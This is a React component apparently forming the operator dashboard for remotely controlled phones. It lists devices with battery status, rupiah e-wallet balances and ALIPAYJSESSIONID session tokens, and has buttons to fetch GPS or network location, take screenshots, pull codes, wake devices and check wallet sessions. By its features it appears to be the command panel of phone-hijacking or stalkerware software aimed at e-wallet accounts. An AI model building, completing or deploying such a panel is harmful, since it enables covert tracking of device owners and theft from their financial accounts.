import { useDispatch, useSelector } from "react-redux"
import { useNavigate } from "react-router-dom"
import { useEffect, useState } from "react"
import { MdDeviceUnknown } from "react-icons/md"

import { Prism as SyntaxHighlighter } from "react-syntax-highlighter"
import { vscDarkPlus } from "react-syntax-highlighter/dist/esm/styles/prism"
import { toast } from "react-toastify"

import { logout } from "../../store/authSlice.js"

import axios from "axios"

function ModalGroupHeader({ code }) {
  const { DEFAULT_IMAGE } = useSelector((state) => state.config)

  return (
    <div className="modal-header p-0 border-0 mt-2 mb-4">
      <div className="d-flex gap-3 p-0">
        <div className="col-3">
          <img
            className="ratio ratio-1x1 rounded"
            src={code.thumb || DEFAULT_IMAGE}
            style={{ aspectRatio: "1/1", objectFit: "cover" }}
            onError={(e) => {
              e.target.onerror = null
              e.target.src = DEFAULT_IMAGE
            }}
          />
        </div>
        <div className="col d-flex flex-column justify-content-between py-1" style={{ minWidth: 0 }}>
          <div>
            <h5 className="fw-bold text-truncate w-100" style={{ maxWidth: "80%" }}>
              {code.model}
            </h5>
            <p className="font-8 text-truncate w-100" style={{ maxWidth: "80%" }}>
              {code.id}
            </p>
          </div>
          <div className="d-flex flex-column gap-2">
            <span className="font-8">
              {code?.battery?.percentage || "UNKNOWN"}% {code?.battery?.status || "STATUS"}
            </span>
            <span className="font-8">community {code.community}</span>
            <span className="font-8 text-info">Rp.{code.balanceDisplay}</span>
          </div>
        </div>
      </div>
    </div>
  )
}

function DeviceCard({ device, onDoubleClick }) {
  const { DEFAULT_IMAGE } = useSelector((state) => state.config)

  const [duration, setDuration] = useState("00:00:00")

  useEffect(() => {
    const interval = setInterval(() => {
      const c = new Date() - new Date(device.start)
      const h = Math.floor(c / (1000 * 60 * 60))
      const m = Math.floor((c % (1000 * 60 * 60)) / (1000 * 60))
      const s = Math.floor((c % (1000 * 60)) / 1000)

      setDuration(`${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`)
    }, 1000)

    return () => clearInterval(interval)
  }, [device.start])

  return (
    <div className="col-4 col-md-3 col-lg-2 p-1 rounded disable-select pointer" onDoubleClick={onDoubleClick}>
      <div className="ratio ratio-1x1 rounded p-0">
        <img
          src={device.thumb || DEFAULT_IMAGE}
          className="w-100 h-100 object-fit-cover rounded"
          onError={(e) => {
            e.target.onerror = null
            e.target.src = DEFAULT_IMAGE
          }}
        />
        <div className="w-100 h-100 position-absolute p-1 d-flex flex-column justify-content-between align-items-start device-card-container-layer rounded">
          <div className="d-flex w-100 justify-content-end align-items-end p-0">
            <span className="device-card-pill">{duration}</span>
          </div>
          <div className="px-1" style={{ minWidth: 0 }}>
            <span className="d-block w-100 text-truncate fw-bold font-8">{device.model}</span>
            <span className="d-block w-100 text-truncate font-7 mb-1">
              {device?.battery?.percentage || "UNKNOWN"}% {device?.battery?.status || "STATUS"}
            </span>
            <span className="d-block w-100 text-truncate font-7">Rp.{device.balanceDisplay || "-"}</span>
          </div>
        </div>
      </div>
    </div>
  )
}

export default function Devices() {
  const { API_1, DEFAULT_IMAGE } = useSelector((state) => state.config)
  const { accessToken } = useSelector((state) => state.auth)
  const { devices } = useSelector((state) => state.dana)

  const [code, setCode] = useState({})

  const dispatch = useDispatch()
  const navigate = useNavigate()

  const handleDetail = async (data) => {
    const el = document.getElementById("modal-detail")
    const modal = new bootstrap.Modal(el)

    setCode(data)
    modal.show()
  }

  const checkSession = async (ALIPAYJSESSIONID) => {
    try {
      const { data } = await axios.post(API_1 + "/dana/check", { ALIPAYJSESSIONID }, { headers: { Authorization: `Bearer ${accessToken}` } })

      toast.success("session active", {
        position: "top-center",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: true,
        pauseOnHover: false,
        draggable: true,
        progress: undefined,
        theme: "colored",
      })

      setCode({ data, ...code })
    } catch (error) {
      const status = error.status && typeof error.status === "number" ? error.status : error.response && error.response.status ? error.response.status : 500
      const message = error.response && error.response.data.message ? error.response.data.message : "Internal Server Error"

      toast.error(message, {
        position: "top-center",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: true,
        pauseOnHover: false,
        draggable: true,
        progress: undefined,
        theme: "colored",
        onClose: () => {
          if (status === 401) {
            dispatch(logout())
            navigate("/login", { replace: true })
          }
        },
      })
    }
  }

  const handleAction = async (params) => {
    try {
      let url = `${API_1}/socket/toggle`

      const action = params.action

      if (action === "location") url = `${API_1}/socket/location`
      if (action === "screen") url = `${API_1}/socket/screen`

      const id = code.id
      const model = code.model

      const { data } = await axios.post(url, { id, model, ...params }, { headers: { Authorization: `Bearer ${accessToken}` } })
      const { message } = data

      if (action === "screen" && data.buffer?.data) {
        const uint8 = new Uint8Array(data.buffer.data)
        const blob = new Blob([uint8], { type: "image/png" })
        const url = URL.createObjectURL(blob)

        setCode({ ...code, url })

        window.location.href = url
      } else if (action === "pull" && data.data) {
        const uint8Array = new Uint8Array(data.buffer.data)
        const binary = uint8Array.reduce((acc, byte) => acc + String.fromCharCode(byte), "")

        const newTab = window.open()

        newTab.document.write(`<textarea style="width: 100%; height: 100%;">${binary}</textarea>`)
      } else if (action === "location") {
        const maps = `https://www.google.com/maps?q=${data.latitude},${data.longitude}&hl=id&z=15&output=embed`
        const obj = { ...code, maps, data }

        setCode(obj)

        window.open(maps, "_blank")
      } else {
        setCode({ ...code, data })
      }

      if (message) {
        toast.success(message, {
          position: "top-right",
          autoClose: 1500,
          hideProgressBar: true,
          closeOnClick: true,
          pauseOnHover: false,
          draggable: true,
          progress: undefined,
          theme: "colored",
        })
      }
    } catch (error) {
      const status = error.status && typeof error.status === "number" ? error.status : error.response && error.response.status ? error.response.status : 500
      const message = error.response && error.response.data.message ? error.response.data.message : "Internal Server Error"

      toast.error(message, {
        position: "top-right",
        autoClose: 1500,
        hideProgressBar: true,
        closeOnClick: true,
        pauseOnHover: false,
        draggable: true,
        progress: undefined,
        theme: "colored",
        onClose: () => {
          if (status === 401) {
            dispatch(logout())
            navigate("/login", { replace: true })
          }
        },
      })
    }
  }

  return (
    <>
      <div className="d-flex align-items-center gap-1 p-2 mb-2 disable-select pointer">
        <div className="p-1 fs-5">
          <MdDeviceUnknown />
        </div>
        <span className="fw-bold">{devices.length} DEVICE CONNECTED</span>
      </div>
      <div className="modal fade modal-backdrop-filter" id="modal-detail" data-bs-backdrop="static" data-bs-keyboard="false">
        <div className="modal-dialog modal-dialog-centered d-flex h-100">
          <div className="modal-content h-100 p-2" style={{ backgroundColor: "transparent", border: 0 }}>
            <ModalGroupHeader code={code} />
            <div className="modal-body d-flex flex-column justify-content-between p-0">
              <div className="col rounded mb-4 border border-2 border-light" id="container-code" style={{ height: "50vh" }}>
                <SyntaxHighlighter language="javascript" className="rounded" style={vscDarkPlus} customStyle={{ margin: 0, height: "100%", background: "#1e1e1e", scrollbarWidth: "none" }}>
                  {JSON.stringify(code, null, 2)}
                </SyntaxHighlighter>
              </div>

              <div className="d-flex flex-row gap-2 mb-4">
                <button className="w-100 btn btn-sm btn-danger" onClick={() => handleAction({ action: "stop" })}>
                  TERMINATE SOCKET
                </button>
                <button className="w-100 btn btn-sm btn-danger" onClick={() => handleAction({ action: "restart" })}>
                  RESTART SOCKET
                </button>
              </div>
              <div className="d-flex flex-row gap-2 mb-2">
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => handleAction({ action: "location", provider: "network" })}>
                  LOCATION NETWORK
                </button>
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => handleAction({ action: "location", provider: "gps" })}>
                  LOCATION GPS
                </button>
              </div>
              <div className="d-flex flex-row gap-2 mb-2">
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => handleAction({ action: "pull" })}>
                  PULL CODE
                </button>
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => handleAction({ action: "screen" })}>
                  SCREEN
                </button>
              </div>
              <div className="d-flex flex-row gap-2 mb-2">
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => handleAction({ action: "ping" })}>
                  PING
                </button>
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => handleAction({ action: "wakeup" })}>
                  WAKEUP
                </button>
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => handleAction({ action: "balance" })}>
                  BALANCE
                </button>
              </div>
              <div className="input-group input-group-sm mb-2">
                <button className="w-100 btn btn-sm btn-secondary" onClick={() => checkSession(code.ALIPAYJSESSIONID)}>
                  CHECK SESSION
                </button>
              </div>
            </div>
            <div className="modal-footer p-0 py-2 border-0 mb-3">
              <button className="w-100 btn btn-sm btn-secondary" data-bs-dismiss="modal">
                CLOSE
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="row g-1 p-2">
        {devices.map((x, i) => {
          return <DeviceCard device={x} onDoubleClick={() => handleDetail(x)} key={i} />
        })}
      </div>
    </>
  )
}
